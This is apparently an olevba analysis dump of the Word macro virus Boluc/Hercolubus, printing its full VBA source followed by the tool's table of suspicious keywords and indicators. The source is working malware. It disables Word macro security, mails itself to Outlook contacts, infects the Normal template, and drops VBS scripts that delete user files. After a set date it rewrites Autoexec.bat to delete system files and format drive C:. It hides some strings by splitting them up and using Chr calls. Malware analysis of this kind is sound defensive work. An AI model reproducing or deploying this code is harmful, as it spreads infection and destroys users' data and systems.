olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Boluc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Boluc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO eradic.bas 
in file: ./Virus.MSWord.Boluc - OLE stream: 'Macros/VBA/eradic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub eradic()
On Error Resume Next
    Set fsote = CreateObject("Scripting.FileSystemObject")
    Dirs = fsote.getSpecialFolder(1) & "\Docwin.vbs"
    If fsote.FileExists(Dirs) Then
    Else
    Set filN = fsote.CreateTextFile("c:\win2.txt")
    filN.WriteLine "Dim jui"
    filN.WriteLine "Dim oWord"
    filN.WriteLine "On Error Resume Next"
    filN.WriteLine "Set oWord = CreateObject(" + Chr(34) + "Word.Application" + Chr(34) + ")"
    filN.WriteLine "Set jui = oWord.NormalTemplate.VBProject.VBComponents.Item(1)"
    filN.WriteLine "nlines = jui.CodeModule.CountOfLines"
    filN.WriteLine "jui.CodeModule.DeleteLines 1, nlines"
    filN.WriteLine "jui.Name = " + Chr(34) + "Hercolubus" + Chr(34)
    her = "jui.codemodule."
    co = "Inse"
    lu = "rtLi"
    bus = "nes "
    raptor = her & co & lu & bus
    gen = "Sub "
    oci = "Docum"
    daf = "ent_Cl"
    erf = "ose()"
    filN.WriteLine raptor + "1, " + Chr(34) + gen + oci + daf + erf + Chr(34)
    filN.WriteLine raptor + "2, " + Chr(34) + "On Error Resume Next" + Chr(34)
    filN.WriteLine raptor + "3, " + Chr(34) + "Application.ScreenUpdating = False" + Chr(34)
    filN.WriteLine raptor + "4, " + Chr(34) + "nDoc = ActiveDocument.FullName" + Chr(34)
    filN.WriteLine raptor + "5, " + Chr(34) + "If nDoc <> " + Chr(34) + " + Chr(34) +" + Chr(34) + "C:\Microsof.doc" + Chr(34) + " + Chr(34) + " + Chr(34) + " Then" + Chr(34)
    filN.WriteLine raptor + "6, " + Chr(34) + "Nam = ActiveDocument.Name" + Chr(34)
    filN.WriteLine raptor + "7, " + Chr(34) + "nNam = Len(Nam)" + Chr(34)
    filN.WriteLine raptor + "8, " + Chr(34) + "If Right(Nam, 3) = " + Chr(34) + " + Chr(34) + " + Chr(34) + "doc" + Chr(34) + " + chr(34) + " + Chr(34) + " Then" + Chr(34)
    filN.WriteLine raptor + "9, " + Chr(34) + "sEo = Left(Nam, nNam - 4)" + Chr(34)
    filN.WriteLine raptor + "10, " + Chr(34) + "PostN = ActiveDocument.VBProject.VBComponents.count" + Chr(34)
    filN.WriteLine raptor + "11, " + Chr(34) + "For j = 1 To PostN" + Chr(34)
    filN.WriteLine raptor + "12, " + Chr(34) + "Set Pert = ActiveDocument.VBProject.VBComponents.Item(j)" + Chr(34)
    filN.WriteLine raptor + "13, " + Chr(34) + "If Pert.Name = " + Chr(34) + " + Chr(34) +" + Chr(34) + "Hercolubus" + Chr(34) + " + Chr(34) + " + Chr(34) + " Then" + Chr(34)
    filN.WriteLine raptor + "14, " + Chr(34) + "Exit For" + Chr(34)
    filN.WriteLine raptor + "15, " + Chr(34) + "Else" + Chr(34)
    filN.WriteLine raptor + "16, " + Chr(34) + "If j = PostN Then" + Chr(34)
    filN.WriteLine raptor + "17, " + Chr(34) + "hn = " + Chr(34) + " + Chr(34) +" + Chr(34) + "c:\Archivos de programa\Microsoft Office\office\Microsoft.doc" + Chr(34) + "+ chr(34)"
    filN.WriteLine raptor + "18, " + Chr(34) + "Documents.Open FileName:=(hn)" + Chr(34)
    filN.WriteLine raptor + "19, " + Chr(34) + "kh = Dir(hn)" + Chr(34)
    filN.WriteLine raptor + "20, " + Chr(34) + "nC = Len(kh)" + Chr(34)
    filN.WriteLine raptor + "21, " + Chr(34) + "sE = Left(kh, nC - 4)" + Chr(34)
    filN.WriteLine raptor + "22, " + Chr(34) + "Application.Windows(sEo).Activate" + Chr(34)
    filN.WriteLine raptor + "23, " + Chr(34) + "ActiveDocument.SaveAs Filename:=" + Chr(34) + " + Chr(34) + " + Chr(34) + "C:\Microsof.doc" + Chr(34) + " + Chr(34)"
    filN.WriteLine raptor + "24, " + Chr(34) + "ActiveDocument.Select" + Chr(34)
    filN.WriteLine raptor + "25, " + Chr(34) + "Selection.Copy" + Chr(34)
    filN.WriteLine raptor + "26, " + Chr(34) + "Application.Windows(sE).Activate" + Chr(34)
    filN.WriteLine raptor + "27, " + Chr(34) + "Selection.Paste" + Chr(34)
    filN.WriteLine raptor + "28, " + Chr(34) + "ActiveDocument.SaveAs Filename:=nDoc" + Chr(34)
    filN.WriteLine raptor + "29, " + Chr(34) + "ScreenUpdating = True" + Chr(34)
    filN.WriteLine raptor + "30, " + Chr(34) + "ActiveDocument.Close" + Chr(34)
    filN.WriteLine raptor + "31, " + Chr(34) + "End If" + Chr(34)
    filN.WriteLine raptor + "32, " + Chr(34) + "End If" + Chr(34)
    filN.WriteLine raptor + "33, " + Chr(34) + "Next j"""
    filN.WriteLine raptor + "34, " + Chr(34) + "End If" + Chr(34)
    filN.WriteLine raptor + "35, " + Chr(34) + "End If" + Chr(34)
    filN.WriteLine raptor + "36, " + Chr(34) + "End Sub" + Chr(34)
    filN.WriteLine "oWord.Quit"
    filN.Close
    Set filN = fsote.GetFile("C:\win2.txt")
    filN.Copy (Dirs)
    Set filN = fsote.GetFile("C:\win2.txt")
    filN.Delete
End If
End Sub
    
-------------------------------------------------------------------------------
VBA MACRO Hercol.bas 
in file: ./Virus.MSWord.Boluc - OLE stream: 'Macros/VBA/Hercol'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.Run Macroname:="Hercolubus"
End Sub
Sub Autoclose()
Application.Run Macroname:="Planeta"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Hercolubus.bas 
in file: ./Virus.MSWord.Boluc - OLE stream: 'Macros/VBA/Hercolubus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Hercolubus()
' Macro virus HERCOLUBUS, Copyright 2001
' Email Hercolubus@terra.com
' Versión Prueba
On Error Resume Next
Dim oFiles As Word.Document
Dim fsob
Dim fil4
Dim nD
Dim hDi
Dim fil2
Dim sExi
Dim obDir
MkDir "c:\Archivos de Programa\Microsoft Office\Office\"
hDi = "c:\Archivos de Programa\Microsoft Office\Office\winlist.txt"
CommandBars("Tools").Controls("macro").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\SoftWare\Microsoft\Office\9.0\Word\security", "level") = 1&
Options.ConfirmConversions = False: Options.VirusProtection = False: Options.SaveNormalPrompt = False

Set fsob = CreateObject("Scripting.FileSystemObject")
obDir = fsob.getSpecialFolder(1)

If fsob.FileExists(hDi) = False Or Day(Now) Mod 30 = 0 Then
    Dim oOutlook, nMapi, cItem
    Set oOutlook = CreateObject("Outlook.Application")
    Set nMapi = oOutlook.GetNameSpace("MAPI")
    If oOutlook = "Outlook" Then
        nMapi.Logon "Profile", "password"
        For y = 1 To nMapi.AddressLists.count
            Set NueLib = nMapi.AddressLists(y)
            Set cItem = oOutlook.CreateItem(0)
            For Va = 1 To NueLib.AddressEntries.count
                Uf = NueLib.AddressEntries(Va)
                cItem.Recipients.Add Uf
                If Va > 70 Then Exit For
            Next Va
            cItem.Subject = "Lo que necesitabas"
            cItem.Body = "Aquí te envío algo que pueda ser de tu interés"
            cItem.Attachments.Add ActiveDocument.FullName
            cItem.Send
            Uf = ""
        Next y
        nMapi.Logoff
    End If
End If

hDv = obDir & "\winh.vbs"
If fsob.FileExists(hDv) Then
Else
    Dim fwh
    Dim filh1
    Dim filh2
    Dim wth
    Dim filh3
    Dim sh
    Set fwh = CreateObject("scripting.FilesystemObject")
    Set filh1 = fwh.CreateTextFile("c:\winh.txt", True)
    filh1.WriteLine ("dim oWord")
    filh1.WriteLine ("Dim fsob")
    filh1.WriteLine ("Dim fil4")
    filh1.WriteLine ("Dim nD")
    filh1.WriteLine ("On Error Resume Next")
    
    filh1.WriteLine ("Set fsob = CreateObject(" + Chr(34) + "Scripting.FileSystemObject" + Chr(34) + ")")
    filh1.WriteLine ("Set oWord = CreateObject(" + Chr(34) + "Word.Application" + Chr(34) + ")")
    filh1.WriteLine ("Set jui = oWord.NormalTemplate.VBProject.VBComponents.Item(1)")
    filh1.WriteLine ("If jui.Name <> " + Chr(34) + "Hercolubus" + Chr(34) + " Then RunW = 10")
    filh1.WriteLine ("Randomize")
    filh1.WriteLine ("nD = Int((34 * Rnd) + 1)")
    filh1.WriteLine ("If nD < 32 Then")
    filh1.WriteLine ("If nD >= 1 And nD <= 2 Then cFiles =" + Chr(34) + "*.xls" + Chr(34))
    filh1.WriteLine ("If nD > 2 And nD <= 4 Then cFiles =" + Chr(34) + "*.dbf" + Chr(34))
    filh1.WriteLine ("If nD > 4 And nD <= 5 Then cFiles =" + Chr(34) + "*.xls" + Chr(34))
    filh1.WriteLine ("If nD > 5 And nD <= 7 Then cFiles =" + Chr(34) + "*.dwg" + Chr(34))
    filh1.WriteLine ("If nD > 7 And nD <= 9 Then cFiles =" + Chr(34) + "*.mp3" + Chr(34))
    filh1.WriteLine ("If nD > 9 And nD <= 11 Then cFiles =" + Chr(34) + "*.bak" + Chr(34))
    filh1.WriteLine ("If nD > 11 And nD <= 14 Then cFiles =" + Chr(34) + "*.wav" + Chr(34))
    filh1.WriteLine ("If nD > 14 And nD <= 16 Then cFiles =" + Chr(34) + "*.bmp" + Chr(34))
    filh1.WriteLine ("If nD > 16 And nD <= 18 Then cFiles =" + Chr(34) + "*.htm" + Chr(34))
    filh1.WriteLine ("If nD > 18 And nD <= 20 Then cFiles =" + Chr(34) + "*.hlp" + Chr(34))
    filh1.WriteLine ("If nD > 20 And nD <= 22 Then cFiles =" + Chr(34) + "*.chm" + Chr(34))
    filh1.WriteLine ("If nD > 22 And nD <= 24 Then cFiles =" + Chr(34) + "*.jpg" + Chr(34))
    filh1.WriteLine ("If nD > 24 And nD <= 26 Then cFiles =" + Chr(34) + "*.gif" + Chr(34))
    filh1.WriteLine ("If nD > 26 And nD <= 27 Then cFiles =" + Chr(34) + "*.scr" + Chr(34))
    filh1.WriteLine ("If nD > 27 And nD <= 28 Then cFiles =" + Chr(34) + "*.cdr" + Chr(34))
    filh1.WriteLine ("If nD > 28 And nD <= 31 Then cFiles =" + Chr(34) + "*.TTF" + Chr(34))
    filh1.WriteLine ("If fsob.FileExists(" + Chr(34) + obDir + "\ListWin.txt" + Chr(34) + ") Then")
    filh1.WriteLine ("Set List1 = fsob.OpentextFile(" + Chr(34) + obDir + "\ListWin.txt" + Chr(34) + ")")
    filh1.WriteLine ("HL = List1.ReadAll")
    filh1.WriteLine ("List1.Close")
    filh1.WriteLine ("Else")
    filh1.WriteLine ("HL = " + Chr(34) + "ARCHIVOS" + Chr(34))
    filh1.WriteLine ("End If")
    filh1.WriteLine ("Set List1 = fsob.CreateTextFile(" + Chr(34) + obDir + "\ListWin.txt" + Chr(34) + ")")
    filh1.WriteLine ("List1.WriteLine (HL)")
    filh1.WriteLine ("With oWord.FileSearch")
    filh1.WriteLine (".FileName = cFiles")
    filh1.WriteLine (".LookIn =" + Chr(34) + "C:\" + Chr(34))
    filh1.WriteLine (".SearchSubFolders = True")
    filh1.WriteLine (".Execute")
    filh1.WriteLine ("For i = 1 To 2")
    filh1.WriteLine ("Set fil4 = fsob.GetFile(.FoundFiles(i))")
    filh1.WriteLine ("fil4.Delete")
    filh1.WriteLine ("List1.WriteLine Date & " + Chr(34) + " " + Chr(34) + " & .FoundFiles(i)")
    filh1.WriteLine ("Next")
    filh1.WriteLine ("List1.Close")
    filh1.WriteLine ("End With")
    filh1.WriteLine ("Else")
    filh1.WriteLine ("If Date > DateSerial(2001, 5, 27) Then")
    filh1.WriteLine ("Dim fsoh")
    filh1.WriteLine ("Dim fil1")
    filh1.WriteLine ("Dim fil2")
    filh1.WriteLine ("Dim wt")
    filh1.WriteLine ("Dim fil3")
    filh1.WriteLine ("Dim s")
    filh1.WriteLine ("Set fsoh = CreateObject(" + Chr(34) + "scripting.FilesystemObject" + Chr(34) + ")")
    filh1.WriteLine ("Set fil1 = fsoh.OpenTextFile(" + Chr(34) + "c:\Autoexec.bat" + Chr(34) + ")")
    filh1.WriteLine ("s = fil1.readAll")
    filh1.WriteLine ("fil1.Close")
    filh1.WriteLine ("Set fil2 = fsoh.createTextFile(" + Chr(34) + "c:\hercolubus.txt" + Chr(34) + ", True)")
    filh1.WriteLine ("fil2.write (s)")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "@echo off" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "DEL " & obDir + "\*.SYS" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "DEL " & obDir + "\*.DLL" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "DEL " & obDir + "\*.OCX" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "CLS" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "FORMAT C: /u /v:HERCOLUBUS /autotest" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "if not errorlevel 0 goto FORMAT_ERROR" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "CLS" + Chr(34) + ")")
    filh1.WriteLine ("fil2.Close")
    filh1.WriteLine ("Set fil3 = fsoh.GetFile(" + Chr(34) + "c:\hercolubus.txt" + Chr(34) + ")")
    filh1.WriteLine ("fil3.Copy (" + Chr(34) + "c:\Autoexec.bat" + Chr(34) + ")")
    filh1.WriteLine ("Set fil3 = fsoh.GetFile(" + Chr(34) + "c:\hercolubus.txt" + Chr(34) + ")")
    filh1.WriteLine ("fil3.Delete")
    filh1.WriteLine ("End If")
    filh1.WriteLine ("End If")
    filh1.WriteLine ("oWord.Quit False = DoEvents")
    filh1.WriteLine ("If RunW = 10 then")
    filh1.WriteLine ("Dim wsshell")
    filh1.WriteLine ("Set wsshell = wscript.CreateObject(" + Chr(34) + "wscript.Shell" + Chr(34) + ")")
    filh1.WriteLine ("wsshell.Run " + Chr(34) + obDir & "\Docwin.vbs" + Chr(34) + ", 1, True")
    filh1.WriteLine ("End If")
    filh1.Close
    Set filh2 = fwh.GetFile("c:\winh.txt")
    filh2.Copy (hDv)
    Set filh3 = fwh.GetFile("c:\winh.txt")
    filh3.Delete
End If

obDiro = fsob.getSpecialFolder(0) & "\win.ini"
Set fil4 = fsob.OpentextFile(obDiro)
fil4.skipline
fil4.skipline
If fil4.readline = "run=" & hDv Then
fil4.Close
Else
    Set fil4 = fsob.OpentextFile(obDiro)
    tr = fil4.ReadAll
    fil4.Close
    Set fil2 = fsob.CreateTextFile("c:\win1.txt", True)
    fil2.WriteLine ("[windows]")
    fil2.WriteLine ("Load")
    fil2.WriteLine ("run=" & hDv)
    fil2.Write (tr)
    fil2.Close
    Set fil4 = fsob.GetFile("c:\win1.txt")
    fil4.Copy (obDiro)
    Set fil4 = fsob.GetFile("c:\win1.txt")
    fil4.Delete
End If
Set jui = Application.NormalTemplate.VBProject.VBComponents.Item(1)
If jui.Name <> "Hercolubus" Then
Application.Run Macroname:="Eradic"
End If
End Sub

Sub Planeta()
    On Error Resume Next
    Dim fsotx
    Application.DisplayAlerts = False
    Application.ScreenUpdating = False
    Options.ConfirmConversions = False
    ftex = "c:\Archivos de programa\Microsoft Office\Office\winlist.txt"
    Set fsotx = CreateObject("Scripting.FileSystemObject")
    If fsotx.FileExists("C:\Archivos de programa\Microsoft Office\Office\Microsoft.doc") Then
    Else
      ActiveDocument.Select
      Selection.Delete
      ActiveDocument.SaveAs FileName:="C:\Archivos de programa\Microsoft Office\Office\Microsoft.doc"
    End If
    End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autoclose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Docwin.vbs          |Executable file name                         |
|IOC       |winh.vbs            |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

